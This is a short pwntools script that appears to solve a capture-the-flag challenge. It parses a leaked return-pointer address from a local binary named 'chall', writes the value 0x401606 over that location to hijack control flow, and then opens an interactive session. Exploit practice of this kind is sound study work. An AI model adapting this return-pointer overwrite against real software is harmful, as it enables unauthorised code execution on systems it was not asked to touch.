from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# b *0x0000000000401764
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvuntil(' ')
ret_ptr_addr = line[:line.find(b', ')]
print('ret_ptr_addr', ret_ptr_addr)

io.recvuntil(b'write? ')

io.sendline(bytes(str(0x401606), 'ASCII'))

io.recvuntil(b'it? ')
io.sendline(bytes(str(int(ret_ptr_addr, 16)), 'ASCII'))

io.interactive()
